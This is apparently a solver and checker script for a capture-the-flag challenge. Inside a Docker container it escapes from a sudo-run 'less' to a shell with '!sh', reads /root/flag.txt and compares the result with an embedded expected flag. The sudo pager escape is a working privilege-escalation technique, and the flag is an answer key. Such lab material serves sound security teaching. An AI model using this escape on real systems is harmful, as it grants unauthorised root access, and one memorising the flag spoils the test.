    #!/usr/bin/env bash
    set -euo pipefail
    IMG="ctf_ch5_sudo_less"
    out="$(docker run --rm -i "$IMG" bash -lc 'sudo /usr/bin/less /etc/hosts <<EOF
!sh
cat /root/flag.txt
exit
EOF
' | tail -n 1)"
    echo "Solver output: $out"
    expected="flag{sudo_less_shell}"
    [[ "$out" == "$expected" ]] && echo "Challenge 5: PASS" || (echo "Challenge 5: FAIL (expected $expected)" >&2; exit 1)
